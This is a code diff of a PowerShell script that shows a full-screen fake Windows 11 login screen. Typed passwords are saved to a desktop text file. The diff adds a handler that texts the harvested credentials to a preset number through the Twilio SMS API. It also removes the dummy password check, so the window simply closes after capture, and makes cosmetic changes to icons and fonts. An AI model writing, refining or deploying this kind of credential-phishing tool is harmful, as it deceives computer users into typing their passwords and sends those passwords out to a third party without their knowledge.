@@ -7,14 +7,13 @@ $form.Text = "Windows 11"
 $form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
 $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
 $form.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
-#$form.TopMost = $true
  
 # Get screen dimensions
 $screen = [System.Windows.Forms.Screen]::PrimaryScreen
 $screenWidth = $screen.Bounds.Width
 $screenHeight = $screen.Bounds.Height
  
-# Background image (simplified Windows 11 background)
+# Background image
 $background = New-Object System.Windows.Forms.PictureBox
 $background.Dock = [System.Windows.Forms.DockStyle]::Fill
 $background.BackColor = [System.Drawing.Color]::FromArgb(10, 10, 20)
@@ -22,25 +21,16 @@ $form.Controls.Add($background)
  
 # Calculate center positions
 $centerX = $screenWidth / 2
-$loginPanelWidth = 400
-$loginPanelX = $centerX - ($loginPanelWidth / 2)
  
-# User picture (placeholder)
-$userPicture = New-Object System.Windows.Forms.PictureBox
+# User picture - now using Segoe MDL2 Assets
+$userPicture = New-Object System.Windows.Forms.Label
 $userPicture.Size = New-Object System.Drawing.Size(80, 80)
 $userPicture.Location = New-Object System.Drawing.Point(($centerX - 40), 150)
 $userPicture.BackColor = [System.Drawing.Color]::Transparent
-try {
-    $userPicture.Image = [System.Drawing.Image]::FromFile("$env:SystemRoot\System32\oobe\info\logo.png") # Default Windows logo
-} catch {
-    # Create a simple placeholder if image not found
-    $bmp = New-Object System.Drawing.Bitmap(80, 80)
-    $g = [System.Drawing.Graphics]::FromImage($bmp)
-    $g.FillEllipse([System.Drawing.Brushes]::DarkBlue, 0, 0, 80, 80)
-    $g.DrawString("A", (New-Object System.Drawing.Font("Segoe UI", 36)), [System.Drawing.Brushes]::White, 20, 15)
-    $userPicture.Image = $bmp
-}
-$userPicture.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::StretchImage
+$userPicture.Font = New-Object System.Drawing.Font("Segoe MDL2 Assets", 36, [System.Drawing.FontStyle]::Regular)
+$userPicture.Text = [char]0xE77B  # Contact icon in Segoe MDL2 Assets
+$userPicture.ForeColor = [System.Drawing.Color]::White
+$userPicture.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
 $background.Controls.Add($userPicture)
  
 # Username label
@@ -53,7 +43,7 @@ $userLabel.AutoSize = $true
 $userLabel.Location = New-Object System.Drawing.Point(($centerX - ($userLabel.PreferredWidth / 2)), 250)
 $background.Controls.Add($userLabel)
  
-# Password box
+# Password box - FIXED PASSWORD CHARACTER
 $passwordBox = New-Object System.Windows.Forms.TextBox
 $passwordBox.Size = New-Object System.Drawing.Size(300, 30)
 $passwordBox.Location = New-Object System.Drawing.Point(($centerX - 150), 300)
@@ -61,12 +51,12 @@ $passwordBox.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawi
 $passwordBox.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
 $passwordBox.ForeColor = [System.Drawing.Color]::White
 $passwordBox.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
-$passwordBox.PasswordChar = '•'
+$passwordBox.PasswordChar = [char]0x25CF # Using Unicode bullet character
 $passwordBox.Text = "Password"
 $passwordBox.Add_GotFocus({
     if ($this.Text -eq "Password") {
         $this.Text = ""
-        $this.PasswordChar = '•'
+        $this.PasswordChar = [char]0x25CF
     }
 })
 $background.Controls.Add($passwordBox)
@@ -89,27 +79,45 @@ $submitButton.Add_Click({
     $desktopPath = [Environment]::GetFolderPath("Desktop")
     $path = Join-Path -Path $desktopPath -ChildPath "WACHTWOORD.txt"
     $credentials | Out-File -FilePath $path -Encoding UTF8 -Append
+
+    # Stuur wachtwoord via Twilio SMS
+    try {
+        if ($SID -and $Token -and $To -and $From) {
+            $smsBody = Get-Content -Path $path -Raw
+            $creds = New-Object System.Management.Automation.PSCredential($SID, (ConvertTo-SecureString $Token -AsPlainText -Force))
     
-    # Authentication logic
-    if ($password -eq "admin123") { # Example password
-        $form.Close() # Venster sluiten zonder popup
-    } else {
-        [System.Windows.Forms.MessageBox]::Show("Incorrect password", "Error")
-        $passwordBox.Text = ""
+            Invoke-RestMethod -Uri "https://api.twilio.com/2010-04-01/Accounts/$SID/Messages.json" `
+                -Method Post `
+                -Credential $creds `
+                -Body @{
+                    To = $To
+                    From = $From
+                    Body = $smsBody
+                }
+        }
+    } catch {
+        # Foutafhandeling (optioneel loggen)
     }
+
+    # Close the entire application
+    [System.Windows.Forms.Application]::Exit()
 })
 $background.Controls.Add($submitButton)
  
-# Power options (shutdown button in bottom right)
+# Improved Power options button with icon
 $powerButton = New-Object System.Windows.Forms.Button
-$powerButton.Text = "⏻"
-$powerButton.Size = New-Object System.Drawing.Size(50, 50)
+$powerButton.Size = New-Object System.Drawing.Size(60, 60)
 $powerButton.Location = New-Object System.Drawing.Point(($screenWidth - 80), ($screenHeight - 80))
-$powerButton.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Regular)
 $powerButton.BackColor = [System.Drawing.Color]::Transparent
 $powerButton.ForeColor = [System.Drawing.Color]::White
 $powerButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
 $powerButton.FlatAppearance.BorderSize = 0
+$powerButton.FlatAppearance.MouseOverBackColor = [System.Drawing.Color]::FromArgb(50, 50, 50)
+ 
+# Create shutdown icon using Wingdings font
+$powerButton.Font = New-Object System.Drawing.Font("Segoe MDL2 Assets", 24, [System.Drawing.FontStyle]::Regular)
+$powerButton.Text = [char]0xE7E8  # Power symbol in Segoe MDL2 Assets
+ 
 $powerButton.Add_Click({
     $result = [System.Windows.Forms.MessageBox]::Show("Do you want to shut down this computer?", "Shut Down", 
         [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Question)
@@ -119,7 +127,7 @@ $powerButton.Add_Click({
 })
 $background.Controls.Add($powerButton)
  
-# Date and time display (top center)
+# Date and time display
 $timeLabel = New-Object System.Windows.Forms.Label
 $timeLabel.ForeColor = [System.Drawing.Color]::White
 $timeLabel.BackColor = [System.Drawing.Color]::Transparent
@@ -131,7 +139,6 @@ $background.Controls.Add($timeLabel)
 $dateLabel = New-Object System.Windows.Forms.Label
 $dateLabel.ForeColor = [System.Drawing.Color]::White
 $dateLabel.BackColor = [System.Drawing.Color]::Transparent
-$dateLabel.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Regular)
 $dateLabel.AutoSize = $true
 $dateLabel.Location = New-Object System.Drawing.Point(($centerX - ($dateLabel.PreferredWidth / 2)), 100)
 $background.Controls.Add($dateLabel)
@@ -160,4 +167,3 @@ $form.Add_Closing({
  
 # Show the form
 [void]$form.ShowDialog()
-
